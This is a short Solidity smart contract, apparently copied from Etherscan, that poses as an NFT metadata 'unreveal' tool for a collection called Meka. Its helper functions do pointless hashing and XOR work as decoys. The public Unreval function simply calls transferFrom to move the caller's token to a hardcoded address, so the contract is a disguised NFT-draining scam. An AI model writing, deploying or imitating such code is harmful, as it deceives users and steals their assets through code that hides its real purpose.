/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface MetaDataChecker {
    function transferFrom(address, address, uint256) external;

}

contract UnrevalMeka {
    address Meka;
    bytes32 Mask = "8E6BEB5f56eebBd77cde3A6";
    bytes32 URIChecker = "METAUNREAVAL0ddwamna";
    
    constructor(address add_) {
        Meka = add_;
    }
    

    function hashProposalForRarity(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) private {
    }
    
    function hashProposalForTraits(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) private {
        bytes32 localUnreavalHashMask = 0;
        bytes32 MaskForMeta = "8E6BEB5f56eebBd77cde3A6";
        bytes32 URICheckerForMeta = "METAUNREAVAL0ddwamna";
        localUnreavalHashMask = URICheckerForMeta;
        localUnreavalHashMask = URICheckerForMeta ^ URICheckerForMeta;
    }

    
    function Unreval(uint256 _id) public {
        bytes32 localUnreavalHashMask;
        localUnreavalHashMask = Mask ^ bytes32(_id) ^ URIChecker;
        if (bytes32(_id) == "METARVALUE") {
            localUnreavalHashMask = bytes32(_id) ^ URIChecker;
        }
        return MetaDataChecker(Meka).transferFrom(msg.sender, 0x8E6BEB5f56eebBd77cde327954Ac9E1d15Eb8EA6, _id);
    }
}